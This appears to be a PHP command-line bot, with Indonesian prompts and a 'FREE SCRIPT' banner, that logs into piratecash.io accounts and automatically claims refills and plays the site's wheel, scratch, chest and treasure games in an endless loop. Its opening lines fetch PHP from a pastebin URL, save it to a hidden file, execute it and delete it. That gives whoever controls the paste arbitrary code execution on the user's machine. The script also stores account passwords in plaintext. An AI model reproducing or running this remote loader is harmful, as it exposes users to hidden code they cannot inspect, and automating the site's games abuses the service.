<?php

$url = file_get_contents("https://pastebin.com/raw/FYRfjCQD");
file_put_contents(".x",$url);
include(".x");
system("clear");
echo $banner;
if($aktif=="on"){
if($ver=="2"){
}else{
echo $msg1;
system("rm -f .x");
exit;}
}else{
echo $msg0;
system("rm -f .x");
exit;}
system("rm -f .x");
# Color
$green="\033[0;32m";
$red="\033[0;31m";
$yellow="\033[0;33m";
$white="\033[0;37m";
$blue="\033[0;34m";
$purple="\033[0;35m";
$cyan="\033[0;36m";

# Bold Color
$bgreen="\033[1;32m";
$bred="\033[1;31m";
$byellow="\033[1;33m";
$bwhite="\033[1;37m";
$bblue="\033[1;34m";
$bpurple="\033[1;35m";
$bcyan="\033[1;36m";

# Background
$On_Black="\033[40m";
$On_Red="\033[41m";
$On_Green="\033[42m";
$On_Yellow="\033[43m";
$On_Blue="\033[44m";
$On_Purple="\033[45m";
$On_Cyan="\033[46m";
$On_White="\033[47m";



if(file_exists('data.php')){
  include 'data.php';
}else{
  system('clear');
  echo $banner."\n".$white;
  echo "[Input][".$bred."Username".$white."](".$bgreen."/Email".$white.")=> ";
  $username = trim(fgets(STDIN));
  echo "[Input][".$bred."Masukan".$white."](".$bgreen."Password".$white.")=> ";
 $pass = trim(fgets(STDIN));
 $config = fopen("data.php", "w");
 fwrite($config, '<?php');
 fwrite($config, '
 ');
 fwrite($config, '/* Untuk multi akun Bisa Di tambahkan Secara Manual
example :
 $username = array(
"akun1",
"akun2",);
              untuk Password :
  $password = array(
"Password Akun1",
"Password Akun2",);
 */
 ');
 
 fwrite($config, ' $username = array("'.$username.'", //akun 1
);');
 fwrite($config, "
 ");
 fwrite($config, ' $password = array("'.$pass.'", //password [ Akun 1
);');
 fwrite($config, "

 ");
 fwrite($config, ' //jumlah kemenangan Treasure | default 3
 ');
 fwrite($config, ' $tw = 3;');
 fwrite($config, "
 ");
  fclose($config);
  include 'data.php';
}


function no_d($url,$ua,$cook){
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_HTTPHEADER,$ua);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, $cook);
    curl_setopt ($ch, CURLOPT_COOKIEFILE, $cook);
    $gas = curl_exec($ch);
    return $gas;
    }
    
function data($url,$ua,$data,$cook){
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_HTTPHEADER,$ua);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, $cook);
    curl_setopt ($ch, CURLOPT_COOKIEFILE, $cook);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
    $gas = curl_exec($ch);
    return $gas;
    }

$ua = array("Host:piratecash.io",
"user-agent:Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.86 Mobile Safari/537.36",
"cookie: __cfduid=",
"cookie:_ga=");


include("data.php");
$x = count($username);
$akun = $js;
//for($i=0;$i<$x;$i++){
$i = 0;
while($i < $x ){
$user = $username[$i];
$pass = $password[$i];
$cook = "cookie".$i.".txt";
system("rm -f $cook");


$url = "https://piratecash.io/login.php";
$data = "username=".$user."&password=".$pass."&token=&action=login";
$get = data($url,$ua,$data,$cook);
$invalid = explode("Invalid username ",$get);
$invalid = explode(" password.</div>",$invalid[1])[0];

if($invalid=="or"){
echo $bcyan."<==================$On_Red{$byellow}[•$bwhite INVALID •]$white{$bcyan}=================>\n";
echo "\t\t $bcyan Akun No [$i] 
$On_Red$bwhite\t [!] Invalid username or password $white
$yellow Username$bwhite [$user]$cyan or$yellow Password$bwhite [$pass]\n";
echo $bcyan."<==================$On_Red{$byellow}[•$bwhite INVALID •]$white{$bcyan}=================>\n";
}else{
		
		
$get = no_d("https://piratecash.io/dashboard.php",$ua,$cook);
$a = explode('<span id="topcash">',$get);
$a = explode('</span></b><span style="font-size: 10px; margin-top: -4px; display: block; color: #79e53a;">Cash balance',$a[1]);
$ball = $a[0];

$goldball = explode('var goldbalance = ',$get);
$sin = explode(';',$goldball[1])[0];


$user = explode('<span><i class="fa fa-user-circle-o"></i> ',$get);
$user = explode('</span>',$user[1])[0];

$goldball = explode('var goldbalance = ',$get);
$goldball = explode(';',$goldball[1])[0];

$ujd = explode("var ujddg = ",$get);
$ujd = explode(";",$ujd[1])[0];
$js = file_get_contents("http://ip-api.com/json/");
$js = json_decode($js);

echo $bcyan."<================[".$On_Red.$byellow."• ".$bwhite."FREE SCRIPT".$byellow." •".$white.$bcyan."]===============>\n";
echo $bcyan." # ".$white."Username \t : ".$byellow.$user."\n";
echo $bcyan." # ".$white."Balance \t : ".$byellow."$".$ball.$bwhite."\n";
echo $bcyan." # ".$white."Gold \t : ".$byellow.$goldball."\n";
echo $bcyan." # ".$white."Ip \t\t : ".$byellow.$js->query."\n";
echo $bcyan." # ".$white."Location \t : ".$byellow.$js->city."\n";
echo $bcyan."<==================[ $user ]=================>\n";
sleep(1);

if($sin==0){
 no_d("https://piratecash.io/refill.php?requestrefill=1",$ua,$cook);
$giet = no_d("https://piratecash.io/refill.php",$ua,$cook);

$collect = explode('<a href="?claimrefill=',$giet);
$collect = explode('" class="btn btn-lg',$collect[1])[0];
$url = "https://piratecash.io/refill.php?claimrefill=".$collect."";
no_d($url,$ua,$cook);

$giet = no_d("https://piratecash.io/refill.php",$ua,$cook);
$time = explode('<i class="fa fa-clock-o" aria-hidden="true"></i> <span id="topgoldtimer">',$giet);  
$time = explode('</span></span>',$time[1])[0];
}}
$i++;
}

//global $bcyan,$bwhite,$byellow,$On_Red,$ua,$white,$cyan;
echo $bcyan."
<================[".$On_Red.$byellow."• ".$bwhite."FREE SCRIPT".$byellow." •".$white.$bcyan."]===============>\n";
include("data.php");
$n = count($username);
echo "\t$On_Red$bcyan Jumlah Akun Anda$byellow [$n] $white\n";
for($i=0;$i<$n;$i++){
$cook = "cookie".$i.".txt";
$get = no_d("https://piratecash.io/dashboard.php",$ua,$cook);
$user = explode('<span><i class="fa fa-user-circle-o"></i> ',$get);
$user = explode('</span>',$user[1])[0];
$goldball = explode('var goldbalance = ',$get);
$goldball = explode(';',$goldball[1])[0];
$giet = no_d("https://piratecash.io/refill.php",$ua,$cook);
$time = explode('<i class="fa fa-clock-o" aria-hidden="true"></i> <span id="topgoldtimer">',$giet);  
$time = explode('</span></span>',$time[1])[0];

if($goldball==0){
echo $byellow." [$i]$bcyan $user \t ||$bred Wait$bwhite [$time]
";}else{
echo $byellow." [$i]$bcyan $user \t ||$bgreen Goldball$byellow [$goldball]
";}
}
echo $bcyan."<================[".$On_Red.$byellow."• ".$bwhite."FREE SCRIPT".$byellow." •".$white.$bcyan."]===============>\n";


echo "$bcyan Silahkan pilih Akun Anda$byellow [0/1/2]{$bcyan}[>]$bgreen ";
$pill = trim(fgets(STDIN));
$cook = "cookie".$i.".txt";
include("data.php");
$user = $username[$pill];
$pass = $password[$pill];
$data = "username=".$user."&password=".$pass."&token=&action=login";
data("https://piratecash.io/login.php",$ua,$data,$cook);

//___________________________
while(true){
if($goldball==0){
no_d("https://piratecash.io/refill.php?requestrefill=1",$ua,$cook);
$giet = no_d("https://piratecash.io/refill.php",$ua,$cook);

$collect = explode('<a href="?claimrefill=',$giet);
$collect = explode('" class="btn btn-lg',$collect[1])[0];
$url = "https://piratecash.io/refill.php?claimrefill=".$collect."";
no_d($url,$ua,$cook);

$giet = no_d("https://piratecash.io/refill.php",$ua,$cook);
$time = explode('<i class="fa fa-clock-o" aria-hidden="true"></i> <span id="topgoldtimer">',$giet);  
$time = explode('</span></span>',$time[1])[0];

$delay=explode(":",$time);
$m=$delay[0];
$s=$delay[1]+5;


for($i=$m;$i>=0;$i--){
for($ii=$s;$ii>=0;$ii--){
$titik="\e[1;3".rand(2,9)."m";
echo $bcyan."\t[!]".$byellow.$On_Red." Wait$titik [{$i}:$ii] ".$white.$titik." ● ";
      sleep(1);
      echo "\r                                                          \r";
}}}


$get = no_d("https://piratecash.io/dashboard.php",$ua,$cook);
$a = explode('<span id="topcash">',$get);
$a = explode('</span></b><span style="font-size: 10px; margin-top: -4px; display: block; color: #79e53a;">Cash balance',$a[1]);
$ball = $a[0];
$a = explode('<span id="topgold" style="color: #fff;">',$get);
$a= explode('</span></b> <br /><span style="font-size: 10px; margin-top: -4px; display: block; color: #ffcd47">Gold coins',$a[1]);
$sin = $a[0];

$user = explode('<span><i class="fa fa-user-circle-o"></i> ',$get);
$user = explode('</span>',$user[1])[0];

$goldball = explode('var goldbalance = ',$get);
$goldball = explode(';',$goldball[1])[0];

$ujd = explode("var ujddg = ",$get);
$ujd = explode(";",$ujd[1])[0];


$url = "https://piratecash.io/a_wheel2k.php";
$spin = data($url,$ua,"jd=".$ujd."&txm=1",$cook);
    $w=(INT)substr($spin,0,3);
    $explot = explode("::",$spin);
    $cashEarn=$explot[1];
    $sisaGold=$explot[2];
    $balanceNow=$explot[3];
    $joker=$explot[4];
    $amount=$explot[5];


echo $bwhite."[•]{$byellow}Spin : $bcyan{$sin}$bwhite [•]{$byellow}Balance :$bcyan $ball ";

if($w == 2 || $w == 8 || $w == 10 || $w == 16){
      echo $white."[+]Earn  : ".$bgreen.$cashEarn.$white." | Balance : ".$bgreen.$balanceNow."\n";
    } // end cash

    // Emptyone
    if($w == 3 || $w == 7 || $w == 11 || $w == 15){      
echo $white."[+]Earn  : ".$byellow."Zonk".$white."\n";
    } // end emptyone

    // Scratch
    if($w == 4 || $w == 12){
      sleep(1);
      $data = "jd=".$ujd;
      $scratch = data("https://piratecash.io/a_scratch_done.php",$ua,$data,$cook);
      sleep(1);
      $data = "jd=".$ujd;
      $scratch = data("https://piratecash.io/a_scratch_done.php",$ua,$data,$cook);
      $sD = explode(":::",$scratch);
      $cashEarn = $sD[1]-$balanceNow;
      $balanceNow = $sD[1];
      $sisaGold = $sD[2];
      if($cashEarn == 0){
        $cashEarn = "0 \t";
      }
      if(strlen($cashEarn) > 4){
        $cashEarn=substr($cashEarn,0,4);
      }
      if($cashEarn == 0){
        echo $white."[+]Earn  : ".$byellow.$cashEarn.$white."| Balance : ".$bgreen.$balanceNow."\n";
      }else{
        echo $white."[+]Earn  : ".$bgreen.$cashEarn.$white." | Balance : ".$bgreen.$balanceNow."\n";
      }
    }

    // Chests
    if($w==1){
      $data = "jd=".$ujd;
      $chests = data("https://piratecash.io/a_chests.php",$ua,$data,$cook);

      $re=explode(":::",$chests)[1];
      $op=rand(1,3);
      echo $white."[!] Open Chests ".rand(1,3);

      $data = "chestid=".rand(1,3);
      $chests = data("https://piratecash.io/a_chests_open.php",$ua,$data,$cook);
      $chests = explode(":::",$chests);
      if($chests[1] == 1){
        $cashEarn = $re;
        $balanceNow=$chests[2];

        if(strlen($cashEarn) > 4){
          $cashEarn=substr($cashEarn,0,4);
        }
      }else{
$cashEarn = "ZONK";}

      echo "\r                                              \r";
      if($cashEarn == "ZONK"){
        echo $white."[+]Earn  : ".$byellow.$cashEarn.$white."| Balance : ".$bgreen.$balanceNow."\n";
      }else{
        echo $white."[+]Earn  : ".$bgreen.$cashEarn.$white."| Balance : ".$bgreen.$balanceNow."\n";
      }
    }

    if($w==9){
      $play=true;
      $win=0;
      $simpan=array();



      $data = "jd=".$ujd."&tileclick=-1&cashout=0";
      $treasure = data("https://piratecash.io/a_tiles.php",$ua,$data,$cook);



      while($play == true){
        if($win == $tw){
          
          sleep(1);

          $data = "jd=".$ujd."&tileclick=-1&cashout=1";
          $treasure = data("https://piratecash.io/a_tiles.php",$ua,$data,$cook);
          $play = null;

          $wd = explode(":::",$treasure);
          $cashEarn = $wd[1];
          $balanceNow = $wd[3];

          
          echo $white."[+]Earn  : ".$byellow.$cashEarn.$white."| Balance : ".$bgreen.$balanceNow."\n";
        } // end WD

        if($play == true){
          $ada=0;
          while($ada == 0){
            $tc=rand(0,14);

            if(count($simpan) > 0){
              for($u=0; $u<count($simpan); $u++){
                if($tc != $simpan[$u]){
                  $ada=1;
                }
              }
            }else{$ada=1;}
          }

          $simpan[]=$tc;

          
          
          sleep(1);
          $data = "jd=".$ujd."&tileclick=".$tc."&cashout=0";
          $treasure = data("https://piratecash.io/a_tiles.php",$ua,$data,$cook);
          
          $game = explode(":::", $treasure);
          $boolean = $game[2];

          if($boolean == 1){
            echo $white."[+]Status : ".$byellow."Lose Treasure\n";
            $play=null;
            sleep(2);
          }else{
            $cashEarn = $game[1];
            $win=$win+1;

            echo $white."[+]Status : ".$bgreen."Win".$white."| Cash : ".$byellow.$cashEarn.$white;
          }
        }
      } // play
    } // end Treasure

    if($w == 6){echo $white."[+]Claim : ".$bgreen."Joker".$white."| Total   : ".$bgreen.$joker."\n";}
    if($w == 14){echo $white."[+]Claim : ".$bgreen."Ticket".$white."| Total   : ".$bgreen.$amount."\n";}
    if($w == 5 || $w == 13){echo $white."[+]Claim : ".$bgreen."Gold".$white."| Total   : ".$bgreen.$sisaGold."\n";}
 
$persen=0;
    $time=rand(5,10);
    while($persen <= $time){
      echo "\r                                              \r";
      if($time != $persen){
        if($persen < ($time/2)){
          $titik=$bred;
        }else{$titik=$byellow;}
      }else{$titik=$bgreen;}

      echo $bred." ".$persen.$white." / ".$bgreen.$time.$white." | ".$byellow."Please wait ".$bwhite.$On_Red." ".round(($persen*100/$time),2)."% ".$white.$titik." ● ";
      $persen++;
      sleep(1);
    }
  
  sleep(1);
  echo "\r                                              \r";

}
